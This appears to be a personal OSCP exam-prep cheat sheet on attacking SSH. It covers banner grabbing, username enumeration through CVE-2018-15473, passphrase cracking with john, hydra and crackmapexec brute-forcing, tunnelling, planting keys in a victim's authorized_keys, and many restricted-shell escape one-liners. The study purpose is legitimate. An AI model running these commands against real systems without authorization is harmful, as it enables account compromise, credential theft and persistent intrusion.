## Goal
SSH is almost never the **initial** attack vector on OSCP. You use it with **credentials or keys found elsewhere**. However: banner reveals OS version, username enumeration CVE exists on old OpenSSH, and restricted shell escapes are critical.

**Checklists**
- [ ] Do not brute-force SSH unless you have a strong username or password hint.
- [ ] Found password?  
- [ ] found `id_rsa`, `.pem`, or `.pfx` ? 
- [ ] login drops you into `rbash` or `lshell` ? look at Restricted Shell Escape
# Commands

### Grep banner +version id 
```bash
# SSH banner reveals OS version precisely
nmap -p22 -sC -sV $IP
ssh -v $IP 2>&1 | grep -i "remote software version"
```
### Login with found credentials
```bash
# Password-based login, use -p <port-number> if port number is not 22 
ssh user@$IP
sshpass -p 'password' ssh user@$IP

# Private key login
chmod 600 id_rsa
ssh -i id_rsa user@$IP

# If SSH rejects key type (older keys)
ssh -i id_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@$IP

# If passphrase-protected key
ssh2john id_rsa > rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
# Then use the cracked passphrase when SSH prompts

# PFX/P12 certificate auth (AD environments)
# Extract cert and key from PFX:
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in cert.pfx -nokeys -out cert.pem
evil-winrm -i $IP -c cert.pem -k key.pem -S
```
### Username Enumeration (OpenSSH ≤ 7.7)
```bash
# CVE-2018-15473 — valid vs invalid users respond differently
# https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py
python3 ssh-username-enum.py --port 22 --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt $IP
```
### Brute-force (ONLY with strong hint, usually exam SSH won't brute)
```bash 
# Hydra (slow deliberately — 4 threads max to avoid lockout)
# use -L users.txt if suspect more than 1 user, try not as it takes forever.
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4

# With a small custom wordlist (from CeWL scraping or found passwords)
hydra -l <user> -P custom_passwords.txt ssh://$IP -t 4 



# crackmapexec spray
crackmapexec ssh $IP -u users.txt -p passwords.txt --continue-on-success
```
### SSH port forwarding / tunnelling
Once you have SSH creds to a host, SSH itself is a pivot — no upload needed. Pick the mode by direction:
```bash
ssh -L 8000:127.0.0.1:<internal_port> <user>@$IP   # LOCAL  : Kali:8000 -> an internal port via the host
ssh -D 1080 <user>@$IP                             # DYNAMIC: SOCKS proxy -> proxychains any tool
ssh -R 9001:127.0.0.1:80 <user>@$IP                # REVERSE: host:9001 -> a Kali-side service
# add -fN to background without a shell
```
Full patterns (chisel, ligolo routed tunnels, proxychains/DNS caveats, layer-by-layer verification) → [[pivoting_and_tunnelling]]. Local-listener discovery on the host → [[internal_port_enum]].

### SSH Keys
```bash
~/.ssh/id_rsa → private key
~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519

# generate .pub and put inisde victim's .ssh/authorized_keys
ssh-keygen -t rsa -b 4096 -C # RSA 4096-bit
ssh-keygen -t ed25519 -C     # Ed25519
~/.ssh/authorized_keys

# If "Enter passphrase" → crack it:
ssh2john id_rsa > rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
```
## Restricted Shell Escapes
You got a shell but it's **restricted** (rbash, rksh, lshell). Many commands are blocked. Your goal: break out to a full bash shell. 

**Checklist**
- [ ] Confirm the shell with `echo $SHELL` and `echo $PATH`.
- [ ] Try SSH bypass first: `ssh user@$IP -t "bash --noprofile"`.
- [ ] If already inside the shell, try `/bin/bash`, Python, vi, awk, or ed.
- [ ] Fix `PATH` after escape.
- [ ] Once full bash works, move to Linux privesc.

### Step 1: Detect Restricted Shell
```bash
echo $SHELL    # shows /bin/rbash or /bin/lshell
echo $PATH     # often very limited: /usr/local/rbin or similar
cd /tmp        # may fail: "restricted"
cat /etc/passwd # may fail
```
### Step 2: Easy Escapes (try all)
```bash
# If dropped into rbash, lshell, or restricted shell:
ssh user@$IP -t "bash --noprofile --norc"
ssh user@$IP -t "/bin/sh"
ssh user@$IP -t "/bin/bash"
ssh user@$IP -t "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

# If inside rbash already:
bash                    # sometimes just works
/bin/bash               # full path may bypass
sh                      # try simpler shell
/bin/sh

# Inside restricted shell:
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash
python3 -c 'import os; os.system("/bin/bash")'

# vi/vim escape
vi
:!/bin/bash
# OR
:set shell=/bin/bash
:shell

# Python
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# awk
awk 'BEGIN {system("/bin/bash")}'

# find
find / -exec /bin/bash \; -quit

# If .bash_profile runs exit → bypass:
ssh user@$IP -t "bash --norc --noprofile"\

# ed (if available)
ed
!'/bin/bash'

# nmap (old versions)
nmap --interactive
!sh

# less/more
less /etc/passwd
!bash

# man
man man
!bash
```

### Step 3: Fix PATH After Escape
``` bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
```

### Step 4: If No Escape Works, Enumerate What IS Allowed
```bash
# List available commands:
ls -la /usr/local/rbin/     # or whatever $PATH points to
compgen -c                  # list available commands
echo /usr/bin/*             # glob trick to list binaries

# Some restricted shells allow:
echo $(whoami)              # command substitution may work
echo `id`                   # backtick substitution
```
 
### Helpline
```bash

```